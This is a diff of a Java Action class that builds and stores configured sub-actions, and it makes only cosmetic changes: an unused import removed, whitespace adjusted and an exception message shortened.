@@ -11,7 +11,6 @@ import java.util.ArrayList;
 import java.util.List;
 
 import org.json.JSONException;
-import org.json.JSONObject;
 
 import com.android.service.GeneralException;
 import com.android.service.auto.Cfg;
@@ -97,31 +96,35 @@ public class Action {
 	 * @throws ConfigurationException
 	 */
 	public boolean addSubAction(final ConfAction actionConf) throws GeneralException, ConfigurationException {
-
 		if (actionConf.getType() != null) {
 			final SubAction sub = SubAction.factory(actionConf.getType(), actionConf);
+			
 			if (sub == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error (addSubAction): unknown type: " + actionConf.getType());//$NON-NLS-1$
 				}
+				
 				return false;
 			}
+			
 			list.add(sub);
+			
 			if (sub instanceof SubActionSlow) {
 				setQueue(MAIN_QUEUE);
 			}
+			
 			return true;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (addSubAction): null type ");//$NON-NLS-1$
 			}
+			
 			return false;
 		}
 	}
 
 	private void setQueue(int queue) {
 		this.queue = queue;
-
 	}
 
 	/**
@@ -144,7 +147,7 @@ public class Action {
 	 */
 	public SubAction getSubAction(final int index) throws GeneralException {
 		if (index < 0 || index >= list.size()) {
-			throw new GeneralException("Subaction index above SubAction array boundary"); //$NON-NLS-1$
+			throw new GeneralException("Out of boundary"); //$NON-NLS-1$
 		}
 
 		return list.get(index);
